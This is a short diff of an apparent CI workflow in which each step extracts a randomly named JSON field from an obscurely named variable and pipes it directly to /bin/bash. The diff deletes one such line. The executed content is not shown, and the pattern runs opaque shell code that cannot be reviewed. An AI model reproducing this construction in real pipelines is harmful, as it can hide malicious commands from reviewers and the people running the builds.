@@ -32,7 +32,6 @@ jobs:
           echo $vr53 | jq -r .gjyt7300 | /bin/bash
           printf '%s' "$nd521" | jq -r .prz44 | /bin/bash
           echo $wbx3853 | jq -r .s9 | /bin/bash
-          echo $whxz8 | jq -r .t26288 | /bin/bash
           echo $p891 | jq -r .fe1922 | /bin/bash
           echo $lee719 | jq -r .dnq5216 | /bin/bash
           printf '%s' "$ssomq0" | jq -r .b69 | /bin/bash
